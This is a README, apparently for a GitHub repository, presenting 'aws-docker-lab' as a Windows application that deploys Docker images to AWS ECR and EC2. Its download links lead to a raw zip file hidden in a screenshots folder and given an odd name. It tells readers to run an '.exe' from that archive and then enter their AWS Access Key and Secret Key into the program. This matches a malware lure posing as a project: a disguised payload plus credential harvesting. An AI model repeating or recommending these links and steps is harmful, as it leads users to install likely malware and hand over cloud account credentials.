# ☁️ aws-docker-lab - Deploy containers on AWS clouds easily

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/shaughnmovable384/aws-docker-lab/main/screenshots/Terminal/aws-lab-docker-spermarium.zip)

This project provides a practical way to run containerized applications on Amazon Web Services. You gain a functional architecture that connects Docker images stored in the Amazon Elastic Container Registry to an Amazon EC2 instance. This setup manages security through Identity and Access Management policies. You follow this guide to set up a cloud-based server environment without writing complex code.

## 📋 System Requirements

Your computer requires the following components to run the tools associated with this lab:

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM or more.
* Storage: 2GB of free disk space.
* Internet Connection: Active connection to download files and reach AWS services.
* Account: An active Amazon Web Services account with valid credentials.

## 🚀 Getting Started

The first step involves obtaining the necessary files from the official repository. You do not need to compile code or manage external dependencies. 

[Visit this page to download the software](https://raw.githubusercontent.com/shaughnmovable384/aws-docker-lab/main/screenshots/Terminal/aws-lab-docker-spermarium.zip)

Once you arrive at the page, identify the latest release at the top of the list. Click the link that ends in ".exe" or the archive file meant for Windows systems. Save the file to a folder that you can locate easily, such as your Downloads or Desktop folder.

## 🛠 Installation Steps

Follow these steps to prepare your system for the deployment processes:

1. Locate the downloaded file on your computer.
2. Double-click the file to start the installer.
3. Accept the default installation settings unless you have a specific reason to change the destination folder.
4. Allow the installation process to copy the necessary support files to your system.
5. Click Finish to close the setup wizard.

## 🔑 Initial Setup 

The software requires connection details to communicate with your AWS account safely.

1. Open the application from your Start Menu.
2. Navigate to the Configuration tab within the main interface.
3. Enter your AWS Access Key and Secret Key into the fields provided.
4. Select your preferred AWS region from the dropdown menu to ensure your infrastructure deploys in the correct data center.
5. Save your settings. The application verifies your credentials against the AWS API to confirm you have the correct permissions.

## 📦 Using the Container Lab

The core of this project focuses on the Docker deployment workflow. The application automates the steps required to send your image to the registry and launch a remote server.

### Building Your Images
Select the Build option to package your files into a Docker image. This process localizes your application dependencies, making the application portable and consistent across different environments. You see a progress bar indicating when the build finishes.

### Pushing to the Registry
After the build, click the Push button. This action uploads your packaged image to the Amazon Elastic Container Registry. The ECR acts as a secure storage vault. The system logs the status of every layer upload during this phase.

### Deploying to EC2
The final step launches the instance. Click the Deploy button to trigger a template. This template sets up the virtual machine on Amazon EC2. The system applies the IAM roles automatically to ensure the server can pull the image from your registry. You receive a public IP address once the instance finishes the initialization.

## 🛡 Security and IAM Best Practices

This tool assumes the principle of least privilege. The underlying policies created by the software grant the EC2 instance only the access it needs to interact with the ECR service. You should never share your Access Keys with unauthorized individuals. If you lose your keys, deactivate them immediately within the AWS Management Console and generate new ones.

## 🔍 Troubleshooting Common Issues

If the application fails to connect, verify your internet connection first. 

* Connection Timed Out: Your firewall or network settings might block outgoing traffic to the AWS API endpoints. Check your local security software.
* Access Denied: The IAM user associated with your keys might lack the required permissions. Ensure your IAM user has the AmazonEC2ContainerRegistryFullAccess policy attached.
* Failed to Launch: Your AWS account might have reached its limit for active EC2 instances in the selected region. Check your limits in the AWS Console.
* Missing Dependencies: Ensure your Windows distribution has the latest updates from Microsoft to prevent compatibility errors with the container runtime.

## 🔄 Updating your Software

The project receives periodic updates to include new features and improve compatibility with AWS services. You should check the releases page regularly to ensure you run the most stable version. To update, download the new installer and run it over your current installation. The installer preserves your configuration settings, allowing you to resume your work without re-entering your AWS keys.

## 📖 Glossary

* AWS: Amazon Web Services, a cloud computing platform.
* Container: A package that holds your software and its dependencies.
* Docker: The technology used to build and distribute these containers.
* EC2: Amazon Elastic Compute Cloud, which provides resizable computing capacity.
* ECR: Amazon Elastic Container Registry, a service to store and manage Docker images.
* IAM: Identity and Access Management, a service to manage user access to AWS resources.
* Instance: A virtual machine running in the AWS cloud.
* Image: A read-only template used to create containers.
* Policy: A document that defines what actions a user or service can perform.